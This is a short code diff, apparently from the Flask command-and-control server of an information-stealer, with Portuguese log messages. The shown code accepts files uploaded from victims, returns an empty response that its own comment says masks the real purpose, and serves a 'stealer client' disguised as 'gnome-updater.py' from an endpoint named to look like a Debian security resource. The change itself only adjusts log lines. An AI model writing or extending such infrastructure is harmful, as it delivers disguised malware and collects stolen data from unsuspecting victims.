@@ -60,11 +60,11 @@ def admin_upload():
             print(f"\n[+] Arquivo recebido.\nC2_Command > ", end="")
         except Exception as e:
             print(f"\n[!] Erro ao salvar arquivo: {e}.\nC2_Command > ", end="")
-    print("\n[!] Arquivo não existe.\nC2_Command > ", end="")
     return "", 200                                         # Return an empty response to mask the real purpose
 
 @app.route('/security_debian_x386', methods=['GET'])       # Endpoint to serve the stealer client
 def get_stealer_client():
+    print("[+] Cliente recebeu o gnome-updater.py.\nC2_Command > ", end="")
     return send_from_directory('app', 'gnome-updater.py')
 
 latest_command = {"cmd": ""}
